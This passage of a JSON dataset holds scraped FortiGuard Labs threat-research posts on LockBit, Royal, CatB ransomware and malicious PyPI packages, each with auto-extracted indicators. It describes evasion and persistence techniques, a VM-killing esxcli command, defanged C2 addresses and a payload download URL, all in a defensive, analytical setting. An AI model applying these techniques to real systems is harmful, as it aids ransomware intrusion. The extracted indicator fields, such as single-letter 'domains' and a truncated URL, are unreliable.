          "21ee754775ca9f76b2d18d0b87722ffa0c9ab0f676e4aa6ac4881dff580087ac",
          "ad37758c362a38a8718837ece40ed5699e40de11ed58a586c2a6a6d8bb5251bf",
          "009ac15d56c3a5149f10c833b5cc191eede4d33485cab7bc3dd94675a462608c",
          "9a2f837a8adb16632ce4ec3c8b02037a4e96e66e6737ef1169afb2e48e46aa6a",
          "04123ec908c4a60282fa35fed76a377b22a49b6f9bfaf5a81121fd7204b4b83d",
          "9fc0179c7407476ced89b6124fa52f10d178f3a07e3d50c860b1ced98fb77541",
          "35bb66f1cc9e820ef50c22d0abb0f5f7ba8724bebb4a5a795e68790943742928",
          "1302161ca791b3fc01188582a075bbfcfeb5f28715ad527be0fe625ec452b1eb",
          "4864f84ea0f6939751310a2cca43e71a57171f37679cb7853d29a083b1617a09",
          "59ad199d81590be7b83768227fe3a79b115f6c978b8715864ae0e22e5d324e36",
          "9fcf4b0e00d20060274861b41b2c13b68dfedbd2ac0012436b13960b2a570d4f",
          "48c70041def3bf288f7f85ee96eb59a2f7d965963a66e0c86fb3c88b3e079386",
          "6155f0562adfaa75cf46f674cf094d3f23c27b38c8009b6982f48ca4e77c95b1",
          "505b177a6c24c69a9fda1e78db7421fad4893d7c07e3cea91897decfbc4510be"
        ],
        "cve": [],
        "email": [
          "5713a@7686f6a96.com",
          "tracy@golfasian.com",
          "john2@golfasian.com",
          "9ed08@7686f6a96.com"
        ],
        "url": [
          "https://en.wikipedia.org/wiki/UPX"
        ]
      },
      "threat_score": 2.4973767051416584
    }
  },
  {
    "id": "Fortinet_20008",
    "source": "Fortinet",
    "title": "Can You See It Now? An Emerging LockBit Campaign",
    "text": "FortiGuard Labs Threat Research FortiGuard Labs has observed a new LockBit ransomware campaign during last December and January using a combination of techniques effective against AV and EDR solutions. LockBit has been one of the more dangerous ransomware, active since 2019. It was part of several successful attacks against a large variety of industries, including critical infrastructure. This blog post discusses the infection chain and Tactics, Techniques, and Procedures (TTPs) of this campaign. Descriptions of the attack refer to the stages outlined in Figure 1 below. The attack starts with a .img container (1) and a social engineering technique of displaying a single file once it’s mounted while hiding the rest of its files from the user. It can also cause malware analysts to miss the payloads while examining the samples manually. The user is then prompted to open the single visible shortcut (2) file. In some of the cases that we’ve observed, a python script is executed (2.1) using the official Python embed package. The only purpose of the script is to run the subsequent BAT scripts. Some variants used a known UAC bypass method abusing the legitimatefodhelper.exe(3.1). This enables the attacker’s BAT file to run in a new elevated process without the user’s approval. The BAT script (4) does several things: 1. Changes the password of the logged-in user. 2. Copies its files to C:\\ProgramData. 3. Ensures that after the system reboots, it logs in without user interaction (usingSysInternals Autologon). 4. Tries to - a. Set the next reboot to be in Safe Mode using bcdedit.exe. b. Register a new service that will run its VBS script (4.1) using sc.exe. c. Sets the service to run also in Safe-Mode using reg.exe. 5. If it fails, it sets in the registry a BAT file (4.2) to be run on logon as another UI shell by Winlogon. 6. Reboots the machine. The ransomware executable resides within a password-protected archive. The script that runs after boot executes another BAT script (4.3) to extract the ransomware payload. It uses the 7-zip archiver and then runs it with a ‘-pass’ argument that is needed for the malicious executable to unpack itself. The final payload is LockBit. Analysts from TrendMicro have published ananalysisof the ransomware. Targeting focuses on Spanish-speaking victims – all samples target Mexican or Spanish firms, mainly in the consulting and law sectors. Ransomware note: Your data are stolen and encrypted The data will be published on TOR website if you do not pay the ransom You can contact us and decrypt one file for free on this TOR site (you should download and install TOR browser first https://torproject.org) http://<onion address> Your company id for log in: <unique id> The detection rate of the samples in VirusTotal was a minimal single digit, with some completely undetected, suggesting the campaign’s methods are effective in defense evasion. Delivery through a .img container bypasses the Mark of The Web (MOTW) protection mechanism. Multi-stage scripts that extract a password-protected ransomware executable, which is unpacked only when run with a unique password, allow evading traditional signature-based detection. The malware authors have shown a creative and wide-ranging usage of signed, legitimate executables: the mounting of .img files by Windows Explorer, python execution by a signed interpreter, the extraction of encrypted archives by 7-zip, and automatic log-in using Sysinternals’ Autologon. This allows for minimal reliance on custom code, trimming development costs, and staying under the radar of EDRs. This campaign’s highly evasive nature demonstrates that attackers continue to leverage increasingly obscure methodologies to avoid detection. This unique combination of executables wasn’t seen in previous LockBit attacks. These payloads may be related to the LockBit builderleak in late 2022. Hence, a definitive attribution to the original group behind LockBit, or its affiliates, may be difficult. Other cybercriminals would want to associate themselves with the deterrence already afforded by past acts of LockBit. FortiEDR detects and blocks these threats out of the box without any prior knowledge or special configuration. It does this using its post-execution prevention engine to identify malicious activities: All network IOCs have been added to the FortiGuard WebFilter blocklist. FortiGuard Antivirus has coverage in place as follows: W32/Lockbit. K!tr.ransom The FortiGuard Antivirus service engine is included in Fortinet’s FortiGate, FortiMail, FortiClient, and FortiEDR solutions. In addition, as part of our membership in theCyber Threat Alliance, details of this threat were shared in real-time with other Alliance members to help create better protections for customers. Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. Tactic \\ Technique ID Description Command and Scripting Interpreter: Windows Command Shell Command and Scripting Interpreter: Visual Basic Command and Scripting Interpreter: Python User Execution: Malicious File Persistence Boot or Logon Autostart Execution: Winlogon Helper DLL Scheduled Task/Job: Scheduled Task Create or Modify System Process: Windows Service Defense Evasion Subvert Trust Controls: Mark-of-the-Web Bypass Abuse Elevation Control Mechanism: Bypass User Account Control Obfuscated Files or Information: Software Packing Impair Defenses: Safe Mode Boot Data Encrypted for Impact System Shutdown/Reboot 1ef3ae251833be08b6f3e525969ae02c28cb0238e3adb3091e572a10633f7ef7dad61d9f919a9cc84ae633e948946e7546b21dc4d9d47d19d96fd308c7de40cbd73bcd2e29191b260a26d87c3035bde33163cc319649291db9f04c48c94da896ee2b182a56ded459a113513985ff624631a9515c7efa2282708483ace640eb3adca325a0028dc8e41dcf739cd00701a19066fc88c0d22be5316f7a4b7b219fe835bf036bf46fa21f3354d60a2c50d2959e1e9193bec8364575dc3fd4644732ae781ead305cdb5fa0153369431dedd40fe138308fcdf5dfda1cfeaaba296752e31ef3ae251833be08b6f3e525969ae02c28cb0238e3adb3091e572a10633f7ef7dad61d9f919a9cc84ae633e948946e7546b21dc4d9d47d19d96fd308c7de40cbd73bcd2e29191b260a26d87c3035bde33163cc319649291db9f04c48c94da896ee2b182a56ded459a113513985ff624631a9515c7efa2282708483ace640eb3adca325a0028dc8e41dcf739cd00701a19066fc88c0d22be5316f7a4b7b219fe835bf036bf46fa21f3354d60a2c50d2959e1e9193bec8364575dc3fd4644732ae781ead305cdb5fa0153369431dedd40fe138308fcdf5dfda1cfeaaba296752e31858a862390adcaa4cea6782e7dba077697475ff9ada9d75c4897ccd563998af Ransomware Executables cb049c6e59106bbdfd804a9d02bb31ea09a3918018cbb97fb12d2bcf9e475465 documentos.exe 334148a7434f4fd27dcc6600edc2f29e4f11ada0be9f71f807cbd4154abd74be documentos.exe fd3577ff36496320485ffa05681ffa516a56fc4818c3fc89774aa4bb20e2c17f documentos.exe 8465c979990e75262d15e93453287d6107f008035d6d6a05bd3a92c2e3fe1d40 40828437094a02ab467a0c0343d08c110d3b0c2972b609bcdd355667614209f 50f49ac742a127085e0a824bcae7e25326ea0ef0741f0abe34ce494f2c4ef4d2 cc58dcd32a440e7f95d19b653a55c1e2c383efc2bd19443238dd3008c1cbe147 6eb6431dcfb1e7105fb05e2d8b01e231f6d4b82a1df3639499d0adacd00757cc poliovocalist[.]com 198.244.187[.]248 150.129.218[.]231 LockBit Portal URLs hxxp://lockbit3jx6je7tm6hhm6zzafgy6hpil3ur6jmc2a4ugan7xzztv6oqd[.]onion hxxp://lockbitdvbpfczc3yrs37kpp6avnrgr7yygi2f45qxvef2yqi36lpxyd[.]onion hxxp://lockbit3hc6syym13ki2ag5jskr6q5qa3spspjpmtfhh6fufut737zid[.]onion hxxp://lockbitov3afmxgknfhk2o5d4uqrhygd7ty3xqm56qd6zjlu6u43pgyd[.]onion ransomware,FortiEDR,fortiguard labs FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/emerging-lockbit-campaign",
      "scraped_at": "2025-07-20T13:59:54.578203",
      "indicators": {
        "ip_address": [],
        "domain": [
          "egitimatefodhelper",
          "c",
          "ocumentos",
          "eg",
          "r",
          "orproject",
          "cdedit"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "cc58dcd32a440e7f95d19b653a55c1e2c383efc2bd19443238dd3008c1cbe147",
          "8465c979990e75262d15e93453287d6107f008035d6d6a05bd3a92c2e3fe1d40",
          "50f49ac742a127085e0a824bcae7e25326ea0ef0741f0abe34ce494f2c4ef4d2",
          "6eb6431dcfb1e7105fb05e2d8b01e231f6d4b82a1df3639499d0adacd00757cc",
          "334148a7434f4fd27dcc6600edc2f29e4f11ada0be9f71f807cbd4154abd74be",
          "fd3577ff36496320485ffa05681ffa516a56fc4818c3fc89774aa4bb20e2c17f",
          "cb049c6e59106bbdfd804a9d02bb31ea09a3918018cbb97fb12d2bcf9e475465"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://torproject.org"
        ]
      },
      "threat_score": 0.5691964285714286
    }
  },
  {
    "id": "Fortinet_22563",
    "source": "Fortinet",
    "title": "Key Findings from the 2H 2022 FortiGuard Labs Threat Report",
    "text": "FortiGuard Labs Threat Research In the first half of 2022, FortiGuard Labs observed an overall increase in attack frequency paired with the explosive growth of new variants associated with familiar tactics. While attack volume isn’t showing any signs of slowing, the back half of the year gave rise to some other distinct trends in activity. For starters, our team witnessed destructive wipermalware attacksimpacting more organizations across the globe, as well as enterprising cybercriminals reimagining existing botnets and reusing code to power new—and more sophisticated—attacks. In our2H 2022 Threat Landscape Report, we examine the cyber-threat landscape over the year's second half to identify trends and offer insights on what security professionals should know to effectively protect their organizations in the new year and beyond. The report findings are based on the collective intelligence ofFortiGuard Labs, drawn from Fortinet’s vast array of sensors collecting billions of threat events observed around the world during this same period. Below are key takeaways from the report. We’re increasingly seeing cybercriminals take a “work smarter, not harder” approach to unveiling new tactics. From new advanced persistent cybercrime tactics to upgrading old-school botnets like Mirai, bad actors continually find more sophisticated ways to infiltrate networks, making every organization regardless of size or industry a target. In the first half of the year, we saw a resurgence in wiper malware and,as we predicted, this destructive attack playbook has only widened its foothold during the second half of 2022. Wiper malware expanded into other countries, driving a 53% increase in wiper activity from Q3 to Q4. While we initially observed wiper malware being developed and deployed by nation-state actors—particularly in parallel with the Russia-Ukraine war—we’re now seeing wipers being scaled and deployed worldwide. These new strains are increasingly being picked up by cybercriminal groups and used throughout the growing Cybercrime-as-a-Service (CaaS) network. Cybercriminals are also now developing their own wiper malware which is being used readily across CaaS organizations, meaning that the threat of wiper malware is more widespread than ever and all organizations are a potential target, not just those based in Ukraine or surrounding countries. Bad actors always seek to maximize their existing investments and knowledge in attack efforts. Botnet and malware code reuse are efficient, cost-effective ways for criminals to build upon successful attack vectors while making iterative changes, fine-tuning their attacks to sidestep detection. Similar to musicians who remix chart-topping songs, cybercriminals are reimagining old attack strains that proved successful in the past and reintroducing new and enhanced versions. In the second half of 2022, we witnessed the resurgence of familiar names among botnets and malware variants, many of which are more than a year old. For example, when examining botnet threats by prevalence, many of the top botnets are older. Mirai and Gh0st RAT continue to be popular across all regions, yet out of the top five, only RotaJakiro is from the current decade. While there are several new bots on the block, likeRaspberryRobin, we’re observing an interesting rise in attackers’ reliance on established threats. We saw a similar trend with malware. Some top strains observed in 2H 2022 such as Lazarus—which originated in 2010—are household names in cyber history. We also examined a collection of different Emotet variants to analyze their tendency to borrow code from one another. Our research showed that cybercriminals continue creating spinoffs of Emotet, with new variants breaking into roughly six different “species” of malware. Although it may be tempting to write off older threats as history, these anecdotes are a reminder that organizations across all sectors need to remain vigilant. Code reuse and retrofitting—fueled by a growing CaaS ecosystem—underscores the importance of using comprehensive, consolidated security services powered by automation to counter threats. Ransomware remains in full force, with cybercriminals constantly introducing new variants, largely thanks to the proliferation ofRansomware-as-a-Service (RaaS). In the second half of 2022, the top five ransomware families accounted for roughly 37% of all ransomware. GandCrab, aRaaS malwareintroduced in 2018, topped the list. Despite the threat actors behind GandCrab announcing that they were retiring, there were many iterations of GandCrab created during its heyday. There may still be a long tail of variants coming from this operation, which makes the work of groups likeThe Cybercrime Atlas Initiativeessential as they aim to dismantle these large-scale criminal operations permanently. Analyzing cybercriminal tactics and techniques gives us better insight into how to protect against future attack scenarios. In the second half of 2022, drive-by compromise topped the list across all regions as the most common malware delivery approach. This method involves attackers gaining access to victims' systems while browsing online and getting them to download malicious payloads. Organizations should regularly patch software and use intrusion prevention system (IPS) technology to counter this popular malware delivery method. Implementing ongoing cyber-awareness training programs for employees is also critical, as end-users are typically the first line of defense against a cyberattack. As organizations' cyber defenses are improving, bad actors have their work cut out for them as they attempt to gain access to networks and evade detection. However, the growth of CaaS means that there will continue to be a high volume of increasingly sophisticated attacks—and more new variants—for security teams to contend with. To protect against cybercriminals’ growing list of tactics, organizations must focus on consolidating their security technology, reducing the number of vendors they work with to remove complexity from day-to-day operations. In the face of a growing threat landscape, security teams should also consider working with a trusted third party to conductincident response and readiness activities—like developing playbooks and conducting tabletop exercises—to ensure they’re prepared to defend the organization when an incident occurs. The latest Global Threat Landscape Report represents the collective intelligence of FortiGuard Labs, drawn from Fortinet's vast array of sensors collecting billions of threat events observed worldwide during the second half of 2022. The FortiGuard Labs Global Threat Landscape Report uses the MITRE ATT&CK framework to describe how threat actors find vulnerabilities, build malicious infrastructure, and exploit their targets. The report covers global and regional perspectives. Download your copy of the2H 2022 FortiGuard Labs Threat Landscape Reportnow. threat research,cyber attack,threat report,wiper malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/fortiguard-labs-threat-report-key-findings-2h-2022",
      "scraped_at": "2025-07-20T14:00:02.895824",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.40462427745664736
    }
  },
  {
    "id": "Fortinet_47788",
    "source": "Fortinet",
    "title": "Royal Ransomware Targets Linux ESXi Servers",
    "text": "FortiGuard Labs Threat Research FortiGuard Labs has repeatedly warned organizations about ransomware developers' increased targeting of Linux systems. So it came as no surprise when it was reported that a new Royal Ransomware variant has started targeting Linux machines. In this blog post, you will learn about the technical details of this new Linux version. Affected Platforms: Linux, Unix, ESXiImpacted Users:Linux and Virtual Machine UsersImpact:Most files on the compromised machines are encrypted, including virtual machinesSeverity Level:Medium The functionality of the Linux version of Royal Ransomware looks pretty similar to the Windows version. However, it includes some additional functionality to target virtual machines. The sample we analyzed provided the following command line parameters: -id <32 character string>: A 32-character identification string added to the URL in the ransom note identifies the target. This is a compulsory parameter, and the ransomware does not run without it. -ep <percentage>: This parameter defines the portion of each targeted file to be encrypted. Many ransomware operators implement performance optimization strategies that do not encrypt an entire file, thus allowing the ransomware to run faster. In this sample, we found a straightforward implementation of such a strategy. Files smaller than 5,245,000 bytes are always encrypted 100%. For larger files, if the -ep parameter is used then plain and encrypted sections alternate in a way to reach the pre-chosen encryption percentage. -stopvm: This function stops virtual machines from running on the target system, probably to allow the ransomware to release the locking of related files and encrypt them. -vmonly: The name of this parameter indicates it only encrypts virtual machines. However, in the analyzed sample, this parameter did not do anything. This may be a feature that is currently being implemented. -fork: This parameter defines whether the main process should fork itself and allow the child process to do the rest of the work. -log: Sends logs to stdout. The Linux version's ability to interact with virtual machines seems to be the primary difference from the Windows versions. Currently, only the-stopvmfunction is implemented. However, the unfinished-vmonlyparameter indicates there is more to come. When-stopvmis chosen, the stop_vm() function (Figure 1) is called, which executes the following actions before encryption is started: 1) It lists the virtual machines using the following shell command: esxcli vm process list > list 2) It then opens the created file called ‘list’ and parses out the listed ‘World IDs’. 3) In a child process, it then executes the following command with each World ID: esxcli vm process kill --type=hard --world-id=%s This process shuts down all running virtual machines, allowing the ransomware to encrypt these machines as well. The ransomware is deployed using the following command: # ./sample <target folder> -id <32 character ID> [other command line parameters] A target folder must be selected. Otherwise, the sample will exit before encryption. The sample we examined does not have a folder exclusion list, meaning that running the ransomware on the root folder with root privileges would corrupt the operating system. These attributes suggest that the ransomware is executed either manually or by a dropper program that specifies which folders should be encrypted. A simple execution flow looks like this: 1)Encryption test:The program runs an encryption test before doing anything else. This is probably a quality assurance function to ensure that file encryption will be clean and not corrupt the files. This could indicate that the threat actor is serious about the business and wants to ensure that recovery is possible. 2)Command line parameters: The program parses the command line parameters and stores their values for the rest of the execution. 3)Initializing a thread pool(Figure 2): A thread pool is created to execute encryption later. A separate thread is created for every online CPU core the machine has. Each thread runs the same thread_func() function. 4)Searching target files:search_files()function starts from the selected root directory and recursively searches for files. The exclusion list shown in Figure 3 ensures that files that were previously encrypted are not encrypted again and that the ransom note (readme) is not encrypted. The full path of allowed files is put in a queue to enqueue them for the worker threads. 5)Encryption: Threads in the thread pool monitor the queue of target files. When something is in the queue, a worker thread will pop the file from there and start encryption. The encryption is described in detail in the next section. 6)Renaming: As a final step, files are renamed to include the.royal_upostfix (Figure 4). The worker threads perform the encryption. Once a thread pops a new file from the queue, it starts the encryption process on that file as follows: 1)An RSA public key is loaded: An RSA public key was hardcoded in the sample we analyzed. The key is used to encrypt the AES keys that encrypt the files. 2)Random values are generated: For each file, a 32-byte random value is generated that serves as the AES file key and a 16-byte value that serves as the initialization vector for the AES encryption. 3)The file key is encrypted: The generated file key is encrypted using the RSA public key. 4)The file is encrypted: The file key is then used to encrypt the file using the AES CBC algorithm. If the file is bigger than 5245000 bytes (~5 MB), and the-epparameter was set, then only the preselected percentage of the file is encrypted alternatingly, as shown in Figure 5. 5)The key is concatenated to the encrypted file: Once the encryption is finished, the following three values are concatenated to the file: a. Encrypted file key: The decryptor probably loads and decrypts this key to decrypt the file content. b. Original file size: The file is resized to accommodate this additional information, thereby preserving the original file size for recovery. c.-ep value: The percentage of the file that was encrypted is also preserved for recovery. Figure 6 shows the hex dump of a file filled with 0x0 that was encrypted by the ransomware. The -ep value was set to 50% (0x32 in hexadecimal is 50% in decimal). At the end, we see the concatenated encrypted file key, the original file size, and the encryption percentage. All this information may be needed for the decryptor to decrypt this file. The ransom note (Figure 7) is dropped in every folder under the namereadme. OurFortiRecon Adversary-Centric Intelligenceservice is currently tracking 103 active victims of the Royal Ransomware group, primarily targeting the United States. This report shows that threat actors are actively pivoting to attack Linux/Unix environments. Although the sophistication of this sample is not comparable to state-of-the-art Windows ransomware—it doesn’t include defensive evasion, anti-analysis, etc.—it is still very effective. We expect further development from this actor and more ransomware operators turning towards targeting Linux systems. Fortinet customers are already protected from this malware through FortiGuard’s AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog Linux/Filecoder_Royal. A!tr FortiEDR also detects and mitigates the execution of ransomware through a combination of behavioral analysis and integration with machine learning and threat intelligence feeds. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. We also suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. b57e5f0c857e807a03770feb4d3aa254d2c4c8c8d9e08687796be30e2093286c – SHA256 hash of the analyzed sample hxxp://royal2xthig3ou5hd7zsliqagy6yygk2cdelaxtni2fyad6dpmpxedid[.]onion – Royal Ransomware Portal ransomware,FortiGuards Labs,linux FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/royal-ransomware-targets-linux-esxi-servers",
      "scraped_at": "2025-07-20T14:00:09.983806",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "b57e5f0c857e807a03770feb4d3aa254d2c4c8c8d9e08687796be30e2093286c"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.24042073628850488
    }
  },
  {
    "id": "Fortinet_4673",
    "source": "Fortinet",
    "title": "More Supply Chain Attacks via New Malicious Python Packages in PyPi",
    "text": "FortiGuard Labs Threat Research The FortiGuard Labs team has discovered another 0-day attack in the PyPI packages (Python Package Index) by themalware authors ‘Portugal’ and ‘Brazil’ who published the packages ‘xhttpsp’ and ‘httpssp’. These two packages were discovered on January 31, 2023, by monitoring an open-source ecosystem. They were both published on January 27, 2023. Each included one version and an empty description, as shown below. The two packages included the same malicious code in their setup.py installation script, which appears to be encoded with Base64. When we decoded the encoded string, we found python code, some of which are shown below. Within the string, we find an interesting URL, ‘http://54[.]237[.]36[.]60/inject/QrvxFGKvsSJ5E5bx', which the malware reads and then writes to a file to execute. This URL has not previously been detected by any other threat researchers. When accessing the URL, we found heavily obfuscated code, shown below. When we execute the decoded code from Figure 8, we notice that it drops a file to an arbitrary location with a random name and extension. This may be due to changes in the code every time the URL is refreshed. In this case, it drops the file to ‘%USER%\\AppData\\Local\\Temp’ as ‘yzulmvnb.jpg’ and sets a registry key for auto-run. When examining the dropped file, we observe that it is another script similar to the one shown in the URL contents. Let’s try executing this dropped file. One suspicious behavior when executing this file is that it drops a binary executable file to the ‘%USER%’ folder as ‘update.exe’. A handful of vendors flag this dropped executable file as malicious (SHA 256): 618c11e03328eb0cc47ac21964479901dfaaa8a038e4145e247374169d6528f9 As shown in Figure 14, it then runs a Powershell, which is another suspicious behavior. It also copies itself to ‘%USER%\\AppData\\Roaming\\Google’ as ‘Chrome.exe’ and sets autorun for this copied executable. When we dive into the ‘update.exe’ code, we see a binary embedded within it, as shown below. The embedded binary is a .dll file. As shown in the VirusTotal entry below, many vendors flag this binary, ‘Rdudkye.dll,’ as malicious (SHA 256): 19e9dbfe9df33f17664e780909054b48c62d3dd66e11f31f3a657d18ac4c752f While the code is very obfuscated, some functions give clues about what it may do or its capabilities. We can see some interesting functions such as DiscordApi, TelegramApi, Inject, ProcessHollowing, RemoteThreadInjection, HiddenStartup, etc. This blog shows that although the malicious python script may appear simple, it is more complex than it seems with multiple layers. With just a simple copy and paste of a brief code, malware authors are able to easily distribute malicious packages to steal or exfiltrate sensitive data through platforms such as Discord and Telegram. A good indication of a malicious package is when a lot of obfuscation is involved. This technique is quite common among malware authors, so it may be a wise idea for Python end users to check twice for this before using new packages. FortiGuard Labs notified Python Package Index administrators about this malicious package, and they have confirmed that it has been taken down. FortiGuard AntiVirus detects the malicious executables identified in this report as update.exe:MSIL/Agent. OQX!tr.dldr Rdudkye.dll:MSIL/Kryptik. AGJS!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. 618c11e03328eb0cc47ac21964479901dfaaa8a038e4145e247374169d6528f9 Rdudkye.dll 19e9dbfe9df33f17664e780909054b48c62d3dd66e11f31f3a657d18ac4c752f Malicious URLs http://54[.]237[.]36[.]60/inject/QrvxFGKvsSJ5E5bx Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. attack research,malicious,malware,python FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/more-supply-chain-attacks-via-new-malicious-python-packages-in-pypi",
      "scraped_at": "2025-07-20T14:00:17.553376",
      "indicators": {
        "ip_address": [],
        "domain": [
          "zulmvnb",
          "r",
          "hrome",
          "pdate",
          "etup",
          "dudkye"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "618c11e03328eb0cc47ac21964479901dfaaa8a038e4145e247374169d6528f9",
          "19e9dbfe9df33f17664e780909054b48c62d3dd66e11f31f3a657d18ac4c752f"
        ],
        "cve": [],
        "email": [],
        "url": [
          "http://54"
        ]
      },
      "threat_score": 0.4266211604095564
    }
  },
  {
    "id": "Fortinet_65144",
    "source": "Fortinet",
    "title": "Ransomware Roundup – CatB",
    "text": "FortiGuard Labs Threat Research This bi-weekly Ransomware Roundup report from FortiGuard Labs looks at ransomware variants that have gained traction within our datasets and the wider OSINT community. It aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against these variants. This latest edition of the Ransomware Roundup covers the CatB ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High CatB is a reasonably new entrant to the ransomware field, with samples only dating back to December 2022. However, FortiGuard Labs has also found additional samples we believe with medium confidence to be from the same threat actor owing to their using the sameBitcoinwallet. These date to November 2022. The CatB threat actor does not offer a web portal (on TOR or otherwise) to name and shame victims. Contact is only available via an e-mail address in the ransom note. As of the time of writing, there is no indication that the malware operators use a Ransomware-as-a-Service model. Information on the infection vector used by this group is not currently available. However, it’s not likely to differ significantly from those used by other ransomware groups. CatB uses a dropper packaged into a Microsoft Windows Dynamic Link Library (.dll) file. Contained within the dropper is a second .dll file that contains the payload responsible for encrypting files on the victim’s machine. This particular version of CatB uses DLL sideloading to execute the payload’s code. (DLL sideloading places a malicious DLL file in the same directory as a trusted executable. When the executable tries to load a DLL with the same name, the attacker’s DLL is loaded instead.) Execution of the dropper is accomplished using the Windows “rundll32.exe” application. The dropper is packed using UPX, which unpacks the file and executes the code inside. Once the primary code executes, CatB creates an array of barriers to prevent analysis and execution on virtual machines/sandboxes. To validate that the malware has been loaded on a legitimate target, each barrier must be met before the payload is dropped and executed. Among the first of these is a check for the number of processors on the system. Given that most modern physical Windows devices are multi-processor/multi-core computers, there must be at least two to continue. In addition to multi-core processors, most current systems have more than 2GB of RAM installed. Figure 4 above shows a comparison being made to the value of 800 in hexadecimal. In decimal, this corresponds to 2048 or 2GB. The value must be this or greater to continue. The next test involves the hard disk. Most virtual machines are created with just enough resources to do their intended job, while a physical device will have much more. The dropper attempts to validate that the hard disk on the machine meets certain criteria. It uses the API call “DeviceIOControl” to determine this by passing a value of 70000 in hexadecimal. This corresponds to 458752, which is the control code for IOCTL_DISK_GET_DRIVE_GEOMETRY. This provides a mechanism to obtain information on a physical disk (e.g. tracks, sectors and cylinders). If all checks pass, the dropper creates the file “oci.dll”. As mentioned, this version of CatB uses DLL sideloading to execute the payload in “oci.dll”. To do this, theMicrosoft Distributed Transaction Coordinator(MSDTC) service is used to facilitate the process. As MSTDC starts, it reads several DLLs from “C:\\windows\\system32”, which now contains the malicious version of “oci.dll”. CatB alters the username of the service to “LocalSystem” and then starts MSDTC. Even if one anti-VM check fails, MSDTC will still be started. However, it will quickly be followed by a termination event, thereby ending the execution of CatB. Otherwise, “oci.dll” begins its run to encrypt the host system. CatB looks for files to encrypt beyond just the “C:\\” drive, enumerating additional mounted hard drive volumes up to “I”. The ransomware will not encrypt anything that might be considered a functional system file that would prevent a possible recovery (and thereby eliminate any reason to pay a ransom). Interestingly, CatB does not deploy a ransom note in an obvious location (e.g., the user’s desktop) as other ransomware strains do. Instead, every encrypted file has the ransom note prepended to the top of the file. As shown in figures 11 and 12, the ransom demanded is steep at 50BTC on day 1. This is approximately $1,102,010.00 (as of the date of this writing). The cost escalates daily until day five, when it indicates that data will no longer be recoverable. The Bitcoin address used in this sample, along with similar ransomware samples FortiGuard Labs has found, had no funds at the time of writing. As mentioned earlier, the only contact method available is through the attacker’s Proton Mail address. Fortinet customers are already protected from this malware variant as follows: FortiGuard Labs detects known CatB ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. File-based IOCs: 3661ff2a050ad47fdc451aed18b88444646bb3eb6387b07f4e47d0306aac6642 CatB Dropper 83129ed45151a706dff8f4e7a3b0736557f7284769016c2fb00018d0d3932cfa Unpacked CatB Dropper 35a273df61f4506cdb286ecc40415efaa5797379b16d44c240e3ca44714f945b CatB Payload c8e0aa3b859ac505c2811eaa7e2004d6e3b351d004739e2a00a7a96f3d12430c CatB Payload 512587a73cd03c6324ade468689510472c6b9e54074f3cf115aa54393b14f037 CatB Malware Family 9990388776daa57d2b06488f9e2209e35ef738fd0be1253be4c22a3ab7c3e1e2 CatB Malware Family Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt 